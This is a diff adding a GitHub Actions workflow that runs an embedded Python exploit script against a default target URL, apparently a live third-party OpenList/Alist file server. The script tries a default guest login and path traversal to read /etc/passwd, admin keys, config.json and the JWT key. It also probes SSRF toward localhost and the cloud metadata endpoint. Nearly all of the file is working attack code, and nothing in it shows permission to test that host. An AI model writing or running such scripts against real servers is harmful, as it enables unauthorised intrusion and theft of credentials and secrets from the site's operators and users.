@@ -1,0 +1,105 @@
+name: openlist-preauth-poc
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'OpenList base URL'
+        required: false
+        default: 'https://pan.yazinb.icu'
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    env:
+      BASE: ${{ github.event.inputs.target }}
+    steps:
+      - name: Version-independent pre-auth PoC (CVE-2023-42442 traversal, public settings, SSRF)
+        run: |
+          python3 - <<'PYEOF'
+          import urllib.request, urllib.parse, ssl, json, os, sys
+          ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
+          base=os.environ['BASE'].rstrip('/')
+          UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
+          def fetch(method, path, token=None, body=None, raw=False):
+              h={'User-Agent':UA,'Accept':'application/json, text/plain, */*'}
+              if token: h['Authorization']=token
+              data=None
+              if body is not None: data=json.dumps(body).encode(); h['Content-Type']='application/json'
+              req=urllib.request.Request(base+path, data=data, headers=h, method=method)
+              try:
+                  r=urllib.request.urlopen(req, timeout=30, context=ctx)
+                  body=r.read()
+                  return r.status, body if raw else body.decode('utf-8','replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, (e.read() if raw else e.read().decode('utf-8','replace'))
+
+          print("TARGET:", base)
+          # ---- 0) unauth public settings (no token) ----
+          print("\n===== [0] /api/public/settings (UNAUTH) =====")
+          s,b=fetch('GET','/api/public/settings')
+          print("HTTP %s len=%d" % (s, len(b)))
+          print(b[:800])
+
+          # ---- 1) guest login to get a token (reuse machinery) ----
+          s,b=fetch('POST','/api/auth/login', body={"username":"guest","password":"guest"})
+          try: tok=json.loads(b).get('data',{}).get('token')
+          except: tok=None
+          print("\nguest login HTTP %s token? %s" % (s, bool(tok)))
+
+          # ---- 2) CVE-2023-42442 style path traversal via /api/fs/get ----
+          # The Alist/OpenList pre-auth path traversal: GET /api/fs/get?path=... uses the
+          # 'src'/'path' param and in vulnerable versions allows '../' to escape and read
+          # server-side files. We try both query 'path' and body 'path' and the trick
+          # '..%2f..%2f' / '../data/config.json' to reach /etc/passwd, admin.key, config.
+          targets = {
+            "/etc/passwd": "../../../../../../etc/passwd",
+            "/var/lib/ffauth/admin.key": "../../../../../../var/lib/ffauth/admin.key",
+            "data/config.json": "../../data/config.json",
+            "data/jwt.key": "../../data/jwt.key",
+          }
+          print("\n===== [2] /api/fs/get path-traversal (UNAUTH + guest) =====")
+          for label, trav in targets.items():
+              for mode, (meth, kw) in {
+                  "query_unauth": ('GET', {'qpath':trav}),
+                  "body_unauth": ('POST', {'bpath':trav}),
+              }.items():
+                  if meth=='GET':
+                      s,b=fetch('GET','/api/fs/get?path='+urllib.parse.quote(kw['qpath'],safe=''))
+                  else:
+                      s,b=fetch('POST','/api/fs/get', body={"path":kw['bpath']})
+                  marker = ('root:x:0:0' in b) or ('admin.key' in label and ('KEY' in b.upper() or len(b)>20)) or ('"token"' in b and 'config' in label)
+                  print("[%s] %s -> HTTP %s len=%d  %s" % (mode, label, s, len(b), ("*** HIT ***" if marker else "")))
+                  if marker or len(b) > 50:
+                      print("    body[:300]:", b[:300].replace('\n',' '))
+          # Also try raw 'src' param escape (Alist CVE payload shape)
+          print("\n--- src-param traversal variants ---")
+          for trav in ["../data/config.json","..%2f..%2f..%2fdata%2fconfig.json","....//....//data/config.json"]:
+              s,b=fetch('GET','/api/fs/get?src='+urllib.parse.quote(trav,safe=''))
+              print("src=%s -> HTTP %s len=%d  %s" % (trav, s, len(b), ("HIT" if 'token' in b.lower() else "")))
+              if 'token' in b.lower(): print("    ", b[:300].replace('\n',' '))
+
+          # ---- 3) /api/fs/list with path traversal (enumerate host fs) ----
+          print("\n===== [3] /api/fs/list traversal (UNAUTH) =====")
+          for trav in ["../../../../../../etc","../","..%2f..%2f..%2f"]:
+              s,b=fetch('POST','/api/fs/list', body={"path":trav,"page":1,"per_page":20})
+              print("list path=%s -> HTTP %s len=%d" % (trav, s, len(b)))
+              print("    ", b[:200].replace('\n',' '))
+
+          # ---- 4) raw_url SSRF probe via /api/fs/get (force raw_url to internal host) ----
+          print("\n===== [4] raw_url SSRF probe /api/fs/get =====")
+          # In some versions the signed raw_url can be coerced to internal targets.
+          for payload_path in ["http://127.0.0.1:80/","http://169.254.169.254/latest/meta-data/","http://127.0.0.1:5344/"]:
+              s,b=fetch('POST','/api/fs/get', body={"path":payload_path})
+              print("raw_url path=%s -> HTTP %s len=%d" % (payload_path, s, len(b)))
+              print("    ", b[:200].replace('\n',' '))
+          # also try the unauthenticated /api/fs/get with a remote URL directly
+          s,b=fetch('GET','/api/fs/get?path='+urllib.parse.quote('http://169.254.169.254/latest/meta-data/',safe=''))
+          print("GET ?path=http://169.254.169.254/ -> HTTP %s len=%d" % (s, len(b)))
+          print("    ", b[:200].replace('\n',' '))
+
+          print("\nDONE")
+          PYEOF
